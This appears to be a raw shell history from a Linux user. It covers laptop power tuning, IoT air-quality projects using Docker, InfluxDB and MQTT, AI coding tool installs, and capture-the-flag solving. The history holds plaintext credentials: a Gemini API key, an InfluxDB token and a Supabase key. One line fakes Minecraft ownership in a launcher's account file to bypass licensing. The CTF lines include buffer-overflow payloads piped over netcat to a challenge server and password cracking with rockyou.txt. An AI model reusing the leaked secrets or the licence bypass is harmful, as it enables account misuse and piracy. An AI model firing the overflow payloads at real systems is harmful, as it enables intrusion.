cpupower frequency-info

sudo pacman -S cpupower
sudo systemctl stop tlp

watch -n 1 "cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq; cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor"

nvim text.txt
nvim delete.txt
cat text.txt
history > text.txt
sudo pacman -S ccache
export PATH="/usr/lib/ccache:$PATH"
g++ main.cpp -o code

rm code
./code
sudo pacman -Ss csignal
sudo pacmcan -Ss csignal
pamixer set Master 50%
amixer set Master 50%
sudo pacman -S pamixer
volume_key
nvim Downloads/copyparty-sfx.py
cd ~/.emacs.d
./bin/doom sync

doom sync
python copyparty-sfx.py
# Current power draw (in microwatts)
cat /sys/class/power_supply/BAT*/power_now

# Convert to watts (divide by 1,000,000)
echo "scale=2; $(cat /sys/class/power_supply/BAT0/power_now)/1000000" | bc

lspci
sudo nvim   /etc/tlp.conf

sudo pacman -S tlp tlp-rdw
sudo systemctl enable --now tlp.service
sudo systemctl mask systemd-rfkill.service
sudo systemctl mask systemd-rfkill.socket

sudo pacman -S tlp tlp-rdw
sudo envycontrol -q

# Try nvidia-smi (should fail or show no output)
nvidia-smi
yay -S envycontrol

bumblebeed --help
bumblebeed
sudo pacman -S bumblebee
sudo pacman -S optimus-manager
yay -S optimus-manager-qt
brightnessctl set 100%
brightnessctl set 200%
sudo grub-mkconfig  -o /boot/efi/grub/grub.cfg
sudo vim /etc/default/grub
sudo pacman -S syu
sudo mkinitcpio  -P
sudo pacman -S linux-lts
sudo grub-mkconfig -o /boot/grub/grub.cfg

feh --bg-fill  ~/Pictures/Wallpapers/wallhaven-mldl19_1920x1080.png
git push -f origin main
git push origin main
git pull origin main --rebase
touch README.md
rm Readme.txt
touch Readme.txt
git pull
cd projects/argrilink/
curl -X POST -H "Content-Type: application/json" \
-d '{"name":"test","phone":"1234567890","password":"test123","email":"test@test.com","location":{"lat":0,"lng":0,"address":"test","district":"test","state":"test"},"farm_size":10,"soil_type":"test"}' \
http://127.0.0.1:8000/api/auth/register/farmer
python -m uvicorn main:app --reload --host 127.0.0.1 --port 8000 &
pkill -f "python -m uvicorn" && sleep 2
pkill -f "python -m uvicorn"
ps -aux | grep 'uvi'
pkill 37435
cd argrilink/agriculture-backend/
cd projects/agriculture-backend/
cd agriculture-backend/
python -m alembic init alembic
sudo pacman -S python-fastapi python-uvicorn python-sqlalchemy python-pydantic python-python-jose python-passlib python-dotenv python-alembic python-psycopg2
sudo pacman -S python-fastapi
sudo pacman -S python-sqlalchemy
sudo pacman -S python-alembic
# Initialize Alembic in your project root
alembic init alembic
pip install -r requirements.txt
source agri_venv/bin/activate.fish
python -m venv agri_venv
rm -rf agri_venv/
cd argrilink/
sudo pacman -S sqlite-tcl
sudo pacman -S sqlite
sudo pacman -S postfix-mongodb
yay -S mongodb
sudo pacman -S gambas3-gb-mongodb
sudo pacman -Ss gambas3-gb-mongodb
rm -rf ~/.config/windsurf

sudo pacman -Rs $(pacman -Qdtq)

sudo pacman -Rns windsurf

sudo pacman -R windsurf

yay -Q | grep windsurf

pacman -Q | grep windsurf

windsurf
./PrismLauncher-Linux-x86_64.AppImage
cat .local/share/PrismLauncher/accounts.json
echo '{"accounts": [{"entitlement": {"canPlayMinecraft": true,"ownsMinecraft": true},"type": "MSA"}],"formatVersion": 3}' > ~/.local/share/PrismLauncher/accounts.json
chmod +x PrismLauncher-Linux-x86_64.AppImage
freecad
librecad
sudo pacman -S librecad
sudo pacman -S freecad

openscad
sudo pacman -S openscad
sudo pacman -Ss solid
sudo pacman -Ss solid5
sudo pacman -Ss solidedge
sudo pacman -Ss solid edge
sudo pacman -Ss solid-edge
sudo pacman -S compputer-aided
sudo pacman -S compputer aided
sudo pacman -S caed
sudo dmesg | tail -n 40

lsmod | grep 'lenovo\|ideapad'
sudo dmesg -w
sudo acpi_listen
sudo acpi_listen
aDAS
sudo systemctl enable acpid.service
sudo systemctl start acpid.service
sudo pacman -S acpid
sudo evtest
xev | grep KeyPress -A 2
sudo libinput debug-events

xev | grep -A8 -i key

xev

nvim ~/.config/chadwm/chadwm/config.h
mv input.csv main.c nobuild.c nobuild.h  mexcel/
mkdir mexcel
docker stop 323625e25d43
docker stop 97b3ace5791e
docker stop
cd ACM-SUMMER-SCHOOL-KARE/Raspberry\ PI/MQTT\ Broker\ Setup\ Using\ Docker/
python subscriber.py
nvim subscriber.py
python publisher.py
nvim publisher.py
deactivate
cd MQTT\ Pub\ \&\ Sub/
cd MQTT/
docker logs f8ba48319949
docker f8ba48319949 log
mosquitto_pub -h 192.168.169.217 -p 1884 -t "test" -m "hello"

mosquitto_sub -h 192.168.169.217 -p 1884 -t "test" -v

sudo lsof -i:1884

nvim docker-compose.yml
cd ~/ACM-SUMMER-SCHOOL-KARE/Raspberry\ PI/MQTT\ Broker\ Setup\ Using\ Docker/
telnet 192.168.169.217 1884

ip a
:wq
cat generated_data_corrected.csv
nvim comprehensive_aqi.csv
cat rajajinagar_influxdb_2025.csv  | less
python ai_studio_code\(3\).py
python ai_studio_code\(2\).py
cat report_formatted.csv  | less
cat query\(6\).csv  | less
cat report.csv  | less
nvim report.csv
nvim report.py
python report.py
nvim rajajinagar_data_from_free_api.csv
cat rajajinagar_data_from_free_api.csv
nvim ai_studio_code\(1\).py
python ai_studio_code\(1\).py
pip install pandas requests
python ai_studio_code.py
source qr_venv/bin/activate.fish
cd aqi-app/
cd aqi-project/
cd projects/aqi
cd bb/
docker exec -it influxdb influx query 'from(bucket:"iot") |> range(start: -1h)'

ip a | grep 12
history | grep docker

docker-compose up --build

nvim Dockerfile
nvim node-red-flow.json
cd inflow-dashboard
cd projects/aqi-project/perp-aqi/
nvim src/components/TimeSeriesChart.jsx
nvim src/services/proxy.js
nvim src/App.css
nvim src/App.jsx
nvim src/index.jsx
nvim vite.config.js
nvim .env
docker run -d -p 80:80 --name aqi-dashboard inflow-dashboard

docker build -t inflow-dashboard .

npm run build
nvim App.jsx
mv TimeseriesChart.jsx TimeSeriesChart.jsx
cd src/components
cd src/components
git mv TimeseriesChart.jsx TimeSeriesChart.jsx

cd perp-aqi/
mv Dockerfile inflow-dashboard/
mv Dockerfile ../
ls src/components/
nvim  src/components/TimeseriesChart.jsx
mkdir src/components/
mkdir src/components/TimeseriesChart.jsx
nvim src/services/influx.js
mkdir src/services/
mkdir src/services/influx.js
mkdir src
npm install @influxdata/influxdb-client chart.js react-chartjs-2 chartjs-adapter-moment

npm create vite@latest inflow-dashboard -- --template react

npx create-react-app inflow-dashboard --template cra-template-pwa --legacy-peer-deps

npx create-react-app inflow-dashboard --template cra-template-pwa
cd inflow-dashboard

perplexity-cli
perplexity
pip uninstall perplexity-cli
pip install perplexity-cli

pip install click==8.1.3

pip install --upgrade click

perplexity --help
pip install --upgrade pip
pip install pplx-cli

mkdir perp-aqi
python -m venv qr_venv
windsurf .
gemini
mkdir aqi-project
rm -rf project/
mkdir project
cd projects/aqi/
export GEMINI_API_KEY="AIzaSyAxeBRN8_VJQZ4wbcH05ajF9tY6fRU-9G0"

cat gemini-api.txt
cd Documents/
npm install -g @google/gemini-cli

set -Ua fish_user_paths ~/.npm-global/bin

# Install nvm (see latest version at nvm.sh)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
source ~/.bashrc  # or ~/.zshrc depending on your shell

# Install latest node LTS and set as default
nvm install --lts
nvm use --lts

# Now global installs will work, e.g.:
npm install -g @google/gemini-cli

npx https://github.com/google-gemini/gemini-cli

sudo pacman -S nodejs npm

yay -S windsurf
curl -sSL https://raw.githubusercontent.com/xPathin/windsurf-bin-arch/main/install_windsurf | bash

sudo pacman -S windsurf
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/windsurf-stable.gpg] https://windsurf-stable.codeiumdata.com/wVxQEIWkwPUEAGf3/apt stable main" | sudo tee /etc/apt/sources.list.d/windsurf.list > /dev/null
rm -f windsurf-stable.gpg
sudo install -D -o root -g root -m 644 windsurf-stable.gpg /etc/apt/keyrings/windsurf-stable.gpg
wget -qO- "https://windsurf-stable.codeiumdata.com/wVxQEIWkwPUEAGf3/windsurf.gpg" | gpg --dearmor > windsurf-stable.gpg
sudo pacman -S gpg-tui
sudo pacman -R windsurf-bin
sudo pacman -Q windsurf-bin
unzip copy-of-environmental-data-dashboard.zip
mv ~/Downloads/copy-of-environmental-data-dashboard.zip  .
cat influxdb-api-token.txt
echo 'air_quality,region=test temperature=25,humidity=50,mq135=400' | docker exec -i influxdb influx write -b iot -o acm_iot

echo 'air_quality,region=test temperature=25,humidity=50,mq135=400' | \
docker exec -i influxdb influx write -b iot -o acm_iot

docker exec -it influxdb influx write -b iot -o acm_iot --record 'air_quality,region=test temperature=25,humidity=50,mq135=400'

docker logs nodered

docker exec -it influxdb influx bucket create -n iot --org acm_iot --retention 0

docker exec -it influxdb influx bucket delete --name iot --org acm_iot

docker exec -it influxdb influx bucket list

docker exec -it influxdb influx config create \
  --config-name default \
  --host-url http://localhost:8086 \
  --org acm_iot \
  --token QvCJbwZGlETgjQlrnGxUI3fP0Sa3e-2cTQCv5hOP2m28AXu15ReFT0pFbSJXvw8HxK8P0cUmjy0WjwJCaoolJw== \
  --active

docker exec -it influxdb influx config create \
  --config-name default \
  --host-url http://localhost:8086 \
  --organization acm_iot \
  --token QvCJbwZGlETgjQlrnGxUI3fP0Sa3e-2cTQCv5hOP2m28AXu15ReFT0pFbSJXvw8HxK8P0cUmjy0WjwJCaoolJw== \
  --active

echo "QvCJbwZGlETgjQlrnGxUI3fP0Sa3e-2cTQCv5hOP2m28AXu15ReFT0pFbSJXvw8HxK8P0cUmjy0WjwJCaoolJw==" > influxdb-api-token.txt
docker exec -it influxdb influx bucket list --org acm_iot

docker exec -it influxdb influx

influx bucket list

docker compose up -d

docker stop influxdb nodered
docker rm influxdb nodered

mv docker-compose.yml  docker-composebck-.yml
cd acm/influxing/
docker rm -f 92c92668e1e

ls influxdb_data/
cd influxing/
cd acm/
ls MQTT\ Broker\ Setup\ Using\ Docker/
cd Raspberry\ PI/
cd ACM-SUMMER-SCHOOL-KARE/
cat publisher.py | less
cat publisher.py | les
ncat
cd Raspberry\ PI/MQTT\ Broker\ Setup\ Using\ Docker/
ld
cat subscriber.py
cat publisher.py
cd ESP8266/ESP_8266_WiFi_Connection/
brightnessctl set
brightnessctl info
brightnessctl 80%
brightnessctl 30%
brightnessctl 20%
cat supabase.txt
echo "https://jjloynchgixniyhkzdpv.supabase.co \n 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpqbG95bmNoZ2l4bml5aGt6ZHB2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQyNTQzNDcsImV4cCI6MjA2OTgzMDM0N30.7I1kFN942qksGpoOfWM7F7MxOatP902DfrJdHkL8U54" > supabase.txt
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpqbG95bmNoZ2l4bml5aGt6ZHB2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQyNTQzNDcsImV4cCI6MjA2OTgzMDM0N30.7I1kFN942qksGpoOfWM7F7MxOatP902DfrJdHkL8U54" > supabase.txt
echo "https://jjloynchgixniyhkzdpv.supabase.co" > supabase.txt
echo AIzaSyACTawCyIJ2ULCLXTJrnjGBN_LeuQqWmcw
echo "i want to create a air quality monitering system using firebase as db, mq-135 for co2 detection. a temp and humidity sensor-dht-11 , esp8266 as local node, and a hub composed of stm32103c8t6 and sim900A gsm module. plan out and give me all the code+ files + structure needed to create a very robust and good system.  Search the inernet and github to get some good ideas. I want the accuracy of the model we are building to be 95% of ofiicial google aqi for regions.  i want the place/region info where the node is situatted to be sent along with temp,aqi and humidity values. 

dont make it look like ai, keep info professional and concise , no emojis. A website which uses react to display  vizualisation of the graphs of the data from db


this is the plan , firstly dont generate code but make a thorough plan how you will execute this and steps oyu can me to ask you so you can provide me absolute goood service and dont mess up due to overwealming info and screw up " > prompt.txt
cd firmware/esp8266_node/
unzip aqi-monitoring-dashboard.zip
mv ~/Downloads/aqi-monitoring-dashboard.zip  .
cd aqi
mkdir aqi
ls projects/
ls Arduino/
sudo pacman -Ss code | less
sudo pacman -Ss code
sudo pacman -Ss code | grep  'vscode'
sudo pacman -Ss code | grep -l 'code'
sudo pacman -Ss code | grep 'code'
yay -S perplexity-ai-app

sudo pacman -S code
groups
sudo udevadm control --reload-rules
sudo udevadm trigger

ls -l /dev/ttyUSB*

sudo usermod -aG uucp bb

groups

sudo udevadm control --reload-rules
sudo udevadm trigger
# Unplug and re-plug the CH340 device.

sudo nano /etc/udev/rules.d/50-microcontroller.rules

lsusb
# Note the idVendor and idProduct values.

sudo usermod -a -G uucp bb 

sudo usermod -a -G uucp yourusername

tmux -q
quit
tmux
feh --bg-fill  ~/Pictures/Wallpapers/wallhaven-d85z1j_1920x1080.png
feh --bg-fill  ~/Pictures/Wallpapers/wallhaven-9o57x1_1920x1080.png
feh --bg-fill  ~/Pictures/Wallpapers/wallhaven-5yd6d5_1920x1080.png
feh --bg-fill  ~/Pictures/Wallpapers/wallhaven-5ge715_1920x1080.png
feh --bg-fill  ~/Pictures/Wallpapers/wallhaven-3qk76y_1920x1080.png
strings 2.img | grep -i flag
strings 1.img | grep -i flag
strings 0.img | grep -i flag
cd /home/bb/pbctf/death/death_note_extracted
chmod +x Cursor-1.3.8-x86_64.AppImage
source ./Cursor-1.3.8-x86_64.AppImage
rm Cursor-1.3.4-x86_64.AppImage
./Cursor-1.3.4-x86_64.AppImage
file 0.img 1.img 2.img
7z x death_note-disk001.vmdk -odeath_note_extracted
7z l death_note-disk001.vmdk
strings death_note-disk001.vmdk | grep -i flag | head -20
fdisk -l death_note-disk001.vmdk
head -20 death_note.mf
head -20 death_note.ovf
tar -xf /home/bb/pbctf/death/death_note.ova
tar -tf /home/bb/pbctf/death/death_note.ova | head -20
file /home/bb/pbctf/death/death_note.ova
cp ~/Downloads/death_note.ova  .
cd death/
mkdir death
qemu-img convert -f vmdk -O raw Heavenly_Delusions1-disk001.vmdk disk.raw
qemu-img info Heavenly_Delusions1-disk001.vmdk
file Heavenly_Delusions1-disk001.vmdk
tar -xf Heavenly_Delusions1.ova
tar -tf Heavenly_Delusions1.ova
file Heavenly_Delusions1.ova
strings Heavenly_Delusions1.ova | tr -d '\n' | grep 'pb'

strings Heavenly_Delusions1.ova | tr -d '\n'

strings Heavenly_Delusions1.ova
cp ~/Downloads/Heavenly_Delusions1.ova .
cd heavenly/
mkdir heavenly
python3 /home/bb/pbctf/colours-my-life/find_unique_colors.py /home/bb/pbctf/colours-my-life/colors.png
python3 /home/bb/pbctf/colours-my-life/xor_bruteforce.py
python3 /home/bb/pbctf/colours-my-life/cycle_decrypt.py
python3 /home/bb/pbctf/colours-my-life/xor_decrypt.py
rm advanced_reconstruct.py && rm -rf qr_venv
python3 /home/bb/pbctf/colours-my-life/order_and_extract.py /home/bb/pbctf/colours-my-life/colors.png
python3 /home/bb/pbctf/colours-my-life/analyze_colors.py /home/bb/pbctf/colours-my-life/colors.png
cmp -l /home/bb/pbctf/colours-my-life/colors.png /home/bb/pbctf/colours-my-life/colors1.png | head -n 20
python3 /home/bb/pbctf/colours-my-life/extract_flag.py /home/bb/pbctf/colours-my-life/colors.png
python advanced_reconstruct.py
pip3 install stegano
source ~/pbctf/qr/qr_venv/bin/activate.fish
pngcheck /home/bb/pbctf/colours-my-life/colors.png
binwalk /home/bb/pbctf/colours-my-life/colors.png
steghide extract -sf /home/bb/pbctf/colours-my-life/colors.png -p "colors"
steghide extract -sf /home/bb/pbctf/colours-my-life/colors.png
zsteg /home/bb/pbctf/colours-my-life/colors.png
tail -c 100 /home/bb/pbctf/colours-my-life/colors.png | xxd
pngcheck -v /home/bb/pbctf/colours-my-life/colors.png
strings /home/bb/pbctf/colours-my-life/colors.png | grep -i pbctf
file /home/bb/pbctf/colours-my-life/colors.png
pip install pillow opencv-python pyzbar

source qr_venv/bin/activate
source qr_venv/bin/activate && pip install pyzbar pillow
zbarimg -S*.enable qr2.png
cp ~/Downloads/qr2.png .
rm -f *.py && rm -f *_*.png && rm -f xor_*.png && rm -f candidate_*.png && rm -f block_sorted_*.png && rm -f reshaped_*.png && rm -f pattern_replaced.png && rm -f standard_qr.png && rm -f qr2_large.png
rm -f *.py *.png qr_venv
rm -f !(qr1.png|qr2.png)
zbarimg qr1.png
zbarimg qr2_large.png
mv ~/Downloads/qr1.png .
open AKGpihbTkoNfsgtynlBdixJ2c5lVGFXMyzQ9NeRY30fMnkURj4cCAB0_b4urCmBZjwL4RjkeyQg4vu7ghJx9UrpkA90EHqHJqZTN4Io=s2560
ls | grep 'qr'
wget https://drive.google.com/u/0/drive-viewer/AKGpihbTkoNfsgtynlBdixJ2c5lVGFXMyzQ9NeRY30fMnkURj4cCAB0_b4urCmBZjwL4RjkeyQg4vu7ghJx9UrpkA90EHqHJqZTN4Io=s2560
strings qr2.png | grep -i "flag\|pbctf"
zbarimg qr2.png
find ../../.. -name "*.png" -type f | grep -v qr_venv | head -20
qr_venv/bin/python advanced_reconstruct.py
qr_venv/bin/python brute_force_xor.py
qr_venv/bin/python extract_data.py qr2.png
qr_venv/bin/python create_standard_qr.py
qr_venv/bin/python xor_qr.py
zbarimg ../colours-my-life/qr2_original.png
ls -la ../colours-my-life/ | grep qr2
find .. -name "*.png" -type f | grep -v qr_venv
find . -name "*.png" -not -name "qr2*.png" -not -path "./qr_venv/*" -type f
qr_venv/bin/python reconstruct_qr.py qr2.png
qr_venv/bin/python analyze_qr.py qr2.png
qr_venv/bin/pip install numpy
identify -verbose qr2.png
pngcheck -v qr2.png
xxd qr2.png | head -20
file *.png
find . -name "*.png" -type f
zbarimg --verbose --set qr.enable qr2.png
qr_venv/bin/python decode_qr_v2.py qr2.png
qr_venv/bin/pip install qrcode
qr_venv/bin/python decode_qr.py qr2.png
qr_venv/bin/pip install pyzbar pillow
pip install qrtools
magick qr2.png -scale 200% qr2_large.png && zbarimg qr2_large.png
convert qr2.png -scale 200% qr2_large.png && zbarimg qr2_large.png
zbarimg -v qr2.png
zbarimg -Sqr.enable qr2.png
file qr2.png
sudo pacman -S python-pipx
pipx install pyzbar
pip install pyzbar pillow
zbarimg -S\*.enable qr2.png
which zbarimg
mv ~/Downloads/qr2.png  .
zbarimg
cd qr
mkdir qr
identify -verbose /home/bb/pbctf/file/file
pngcheck -v /home/bb/pbctf/file/file
unzip /home/bb/pbctf/file/zip_part.zip -d /home/bb/pbctf/file/extracted
unzip -l /home/bb/pbctf/file/zip_part.zip
dd if=/home/bb/pbctf/file/file of=/home/bb/pbctf/file/zip_part.zip bs=1 skip=304580
unzip /home/bb/pbctf/file/file -d /home/bb/pbctf/file/extracted
unzip -l /home/bb/pbctf/file/file
file /home/bb/pbctf/file/file
find /home/bb/pbctf/file -type f -name "*part*"
strings /home/bb/pbctf/file/file | grep -i "part\|secret\|flag\|pbctf\|ctf"
find /home/bb/pbctf/file -name ".part2*" -type f
ls -la /home/bb/pbctf/file/.secret
strings /home/bb/pbctf/file/file
objdump -s -j .rodata warden | grep -A 10 "4020a0"
strings warden | grep -A 5 -B 5 "flag.txt"
objdump -d warden | grep -A 30 "initiate_emergency_override"
objdump -d warden | grep -B 5 -A 5 "initiate_emergency_override"
python3 -c "print('A'*128 + 'B'*8 + '\xd6\x11\x40\x00\x00\x00\x00\x00')" | nc 34.55.150.171 1337
objdump -d warden | grep -A 20 "access_control_interface"
objdump -d warden | grep -A 10 -B 5 "gets@plt"
python3 -c "print('hyjvjhv')" | nc 34.55.150.171 1337
strings file
unzip file
file file
mv ~/Downloads/file .
mv ~/Downloads/file
cd file/
mkdir file
echo "hyjvjhv" | tr 'h' 'a' | tr 'y' 'd' | tr 'j' 'm' | tr 'v' 'i'
echo "hyjvjhv" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
echo "hyjvjhv" | rev
echo "hyjvjhv" | base64 -d
echo "hyjvjhv" | nc 34.55.150.171 1337
nc 34.55.150.171 1337
readelf -s warden | grep -E "(FUNC|OBJECT)" | grep -v "UND" | sort -k3nr | head -20
python3 -c "print('A'*136 + '\xd6\x11\x40\x00\x00\x00\x00\x00')" | nc 34.55.150.171 1337
objdump -d warden | grep -A 30 "access_control_interface"
objdump -d warden | grep -A 5 "4011d6 <initiate_emergency_override>"
objdump -d warden | grep -A 5 "40122d <access_control_interface>"
python3 -c "print('A'*100)" | nc 34.55.150.171 1337
strings warden | head -50
strings warden | grep -A 10 -B 10 "execution node"
objdump -d warden | grep -A 20 "initiate_emergency_override"
objdump -t warden | grep -E "(emergency|override|access)" | head -10
strings warden | grep -E "(pass|key|auth|override|control)" | head -20
strings warden | grep -i warden
strings warden | grep -C 3 hyjvjhv
which strings objdump readelf gdb
file warden
mv ~/Downloads/warden .
cd wardon/
mkdir wardon
binwalk ./chaos
ghidra ./chaos
gdb ./chaos
./chaos
strings chaos
cd ~/pbctf/cahos/
gdb -d ./chaos
gdb -q ./chaos -ex 'b _ZN13martix_puzzle4main17h72f5df97553106d4E' -ex 'r' -ex 'x/30i $pc' -ex 'quit'
gdb -q ./chaos
objdump -d -M intel chaos | grep -A 200 '_ZN13martix_puzzle4main17h72f5df97553106d4E'
objdump -d -M intel chaos | grep -A 100 '<main>:'
objdump -d -M intel chaos
strings chaos | grep 'pbctf'
chmod +x chaos
ls -l chaos
file chaos
ls -F
./kiro
cd Kiro/
tar -xzvf 202508020245-distro-linux-x64.tar.gz

wget https://kiro.dev/download/linux-x64.tar.gz

wget https://kiro.dev/download/linux-x64.tar.gz
tar -xzf linux-x64.tar.gz
./kiro

rm kiro-x86_64.AppImage
./kiro-x86_64.AppImage
chmod +x kiro-x86_64.AppImage

chmod +x kiro-x86_64.AppImage
./kiro-x86_64.AppImage

curl -LO https://kiro.dev/downloads/kiro-x86_64.AppImage

yay -S codeium
ghidra chaos
mv ~/Downloads/chaos  .
cd cahos/
mkdir cahos
grep -r "{" smali

grep -ri "flag" smali
grep -ri "secret" smali
grep -ri "key" smali
grep -ri "pass" smali

cd apk_smali/
aapt dump xmltree yourfile.apk AndroidManifest.xml

apktool d pbctf.apk -o apk_smali

apktool d yourfile.apk -o apk_smali

# Download apktool jar and script:
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jar -O apktool.jar
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
chmod +x apktool
sudo mv apktool /usr/local/bin/
sudo mv apktool.jar /usr/local/bin/apktool.jar

grep -ri "flag" jadx_output
grep -ri "secret" jadx_output

jadx -d jadx_output pbctf.apk 

jadx -d jadx_output yourfile.apk

strings extracted_apk/classes.dex | grep -iE "secret|key|password"

cat extracted_apk/AndroidManifest.xml
grep -r flag extracted_apk/res

strings extracted_apk/classes.dex | grep -i "flag"

unzip pbctf.apk -d extracted_apk

unzip yourfile.apk -d extracted_apk

mv ~/Downloads/pbctf.apk  .
cd apk1/
mkdir apk1
mkdir apk
cd pbctf/
mgba -d  Pokemon\ -\ Fire\ Red\ Version\ \(U\)\ \(V1.1\).gba
mgba  --help
mgba Pokemon\ -\ Fire\ Red\ Version\ \(U\)\ \(V1.1\).gba
cd pbctf/music/
sudo pacman -S mgba-sdl 

sudo pacman -S mgba

mv ~/Downloads/Pokemon\ -\ Fire\ Red\ Version\ \(U\)\ \(V1.1\).gba  .
c,lear
cat Mo0ojic.txt
mv ~/Downloads/Mo0ojic.txt  .
cat P9bvC7kr
wget https://pastebin.com/raw/P9bvC7kr
cd music/
mkdir music
nvim index.html
strings index.html
cat index.html | grep 'pb'
cat index.html
wget https://really-a-vite-app.vercel.app/
cd vite_react/
mkdir vite_react
jadx-gui pbctf.apk

jadx pbctf.apk -d output_dir

jadx yourfile.apk -d output_dir

jadx extracted_folder/classes.dex

yay -S jadx
dex2jar extracted_folder/classes.dex

yay -S dex2jar

cd extracted_folder/
unzip pbctf.apk -d extracted_folder

sudo pacman -S apk-tools
strings pbctf.apk |grep -o 'pbCTF'
strings pbctf.apk |grep -o 'pb'
strings pbctf.apk
file pbctf.apk
mv ~/Downloads/pbctf.apk .
cd apk/
wget 'https://drive.google.com/file/d/1Kml1xqXCh_KbfWFB5PuDcumeqvtRhGul/view?usp=sharing'
strings qr2.png
binwalk  qr2.png
open qr2_inverted.png
sudo pacman -S dynamsoft
yay  -S zbarimg
sudo pacman -S zbarimg
strings qr2.png | tr -d '\n'

steghide extract -sf colors.jpg -p "possible-password"

stegseek colors.png /opt/rockyou.txt
stegseek colors.jpg /opt/rockyou.txt
yay -S stegseek

# Stegseek (often faster than StegCracker)
stegseek colors.jpg /opt/rockyou.txt 

strings colors.jpg
steghide extract -sf colors.jpg

magick colors.png colors.jpg
mv colors.jpg colors.png
ls -l colors.png

convert colors.png colors.jpg
# or, with newer ImageMagick:

convert colors.png colors.jpg
# or, with newer ImageMagick:
magick colors.png colors.jpg

sudo pacman -S convertlit
steghide extract -sf colors.jpg 

mv colors.png colors.jpg
cp colors.png  colors1.png
strings colors.png
steghide extract -sf colors.png 

ls -l -a -h
file colors.png
mv ~/Downloads/colors.png  .
wget 'https://drive.google.com/file/d/1C79CPdWZwrO6gYCFSeVWyqw-Aas-sQVK/view?usp=sharing'
cd colours-my-life/
mkdir colours-my-life
cd ctf/
wget https://dateques-production.up.railway.app/
cd web1/
mkdir web1
brave
sudo pacman -Ss brave
yay -S brave-bin
yay -S brave
sudo pacman -S brave
strings the_flag_is_in_here.mp3 | tr -d '\n'

strings flag.jpg | tr -d '\n'

feh --bg-fill  ~/Pictures/Wallpapers/wallhaven-qrdy1l_1920x1080.png
open flag.jpg
steghide extract -sf flag.jpg

steghide info flag.jpg

strings flag.jpg > text.txt
strings flag.jpg | less
strings flag.jpg
cd extractions/image.png.extracted/2FFD3/
cd pbctf/encoded-canvas/
strings the_flag_is_in_here.mp3
ffplay the_flag_is_in_here.mp3
sudo pacman -S libsox-fmt-mp3

sudo apt-get install libsox-fmt-mp3

play the_flag_is_in_here.mp3
sudo pacman -S sox
steghide -sf flag.jpg
steghide -extract -sf flag.jpg
steghide -e -sf flag.jpg
cd 2FFD3/
cd image.png.extracted/
cd extractions/
binwalk -e image.png

sudo pacman -S binwalk
exiftool image.png

file image.png
steghide info image.png

strings image.png
steghide embed -cf iomage.png -ef secret.txt

steghide extract -sf image.png

yay -S steghide
sudo pacman -S steghide
mv ~/Downloads/image.png  .
mc ~/Downloads/image.png  .
wget 'https://pbctf.pointblank.club/files/d1ba55061b10d33ffa23e6124174410f/image.png?token=eyJ1c2VyX2lkIjo1NSwidGVhbV9pZCI6ODYsImZpbGVfaWQiOjE2fQ.aI2W-Q.3WqLzr9cUHxRRHzYRD7PM4UROQ8'
cd encoded-canvas/
mkdir encoded-canvas
cat login.1
wget https://secret-portal.pbctf.live/login
nvim login
cd commandmnet-zero/
cat login
wget https://web-production-29d84.up.railway.app/login
mkdir commandmnet-zero
mkdir pbctf
chmod +x Cursor-1.3.4-x86_64.AppImage
ghidra
sudo pacman -S ghidra
sudo pacman -S jdk17-openjdk
sudo pacman -Rns ghidra
ghidra --help
ghidra SafeOpener.class
cd reverse_engineering/safe-opener/
ls reverse_engineering/file-run2/
ls reverse_engineering/safe-opener/
ls reverse_engineering/
ls forensics/
yay -S ghidra
sudo pacman -R ghidra
nc titan.picoctf.net 50605
ls /opt/
sudo mv ~/Downloads/rockyou.txt  /opt/
mv ~/Downloads/rockyou.txt  /opt/
grep -R 'rockyou.txt'
grep -oR 'rockyou.txt'
grep -R 'rockyou'
sqlmap
ssh ctf-player@titan.picoctf.net -p 60763
sudo ssh titan.picoctf.net 60763
ssh titan.picoctf.net 60763
ssh titan.picoctf.net
ssh bb@titan.picoctf.net
ssh bb@titan.picoctf.net 60763
cargo run
nvim main.rs
cp main.rs  mainbck.rs
nvim new.rs
cat main.rs
cd fixme1/
tar -xvf fixme1.tar.gz
wget https://challenge-files.picoctf.net/c_verbal_sleep/3f0e13f541928f420d9c8c96b06d4dbf7b2fa18b15adbd457108e8c80a1f5883/fixme1.tar.gz
nc rescued-float.picoctf.net 52589
xcalc
calc_stat
sudo pacman -S xorg-xcalc
sudo pacman  -Ss calculator
calc
clac
sudo pacman -S calc
cat vuln.c
nc rescued-float.picoctf.net 525890x5840b73222a7
clear
nc rescued-float.picoctf.net 65125
objdump -d -S vuln
gcc -o vv vuln.c
cat vuln vuln.c
touch flag.txt
objdump --help vuln
objdump -d vuln
cd pie-time/
cd ctf/pbctf/pie-time/
cd ctf/pbctf/
pkill   222470
ps -aux | grep 'ghidra'
ghidra vuln
sudo pacamn -S ghidra
objdump vuln
./vuln
ls -l -r
./vulc
vulkaninfo
wget https://challenge-files.picoctf.net/c_rescued_float/d2e1a840a827e453fbf8c0360c641e6d2ac67fb198080d054a244ccf84403c31/vuln
rm vuln
nvim vuln.c
wget https://challenge-files.picoctf.net/c_rescued_float/d2e1a840a827e453fbf8c0360c641e6d2ac67fb198080d054a244ccf84403c31/vuln.c
mkdir pie-time
wireshark myNetworkTraffic.pcap
cd phantomintrder/
tshark -r myNetworkTraffic.pcap -Y "tcp.len==12" -T fields -e tcp.segment_data | xxd -p -r | base64 -d
tcpdump -r myNetworkTraffic.pcap
tshark -r myNetworkTraffic.pcap
tcpdump -r yourfile.pcap

wireshark
strings myNetworkTraffic.pcap
history | grep 'pcap'
file myNetworkTraffic.pcap
wget https://challenge-files.picoctf.net/c_verbal_sleep/586d0206891cc683bae1160ad6b0e05d7e10e7b2df122c0441ab06581038dd32/myNetworkTraffic.pcap
wget
mkdir phantomintrder
nvim shell.php
cd nosanity/
mkdir nosanity
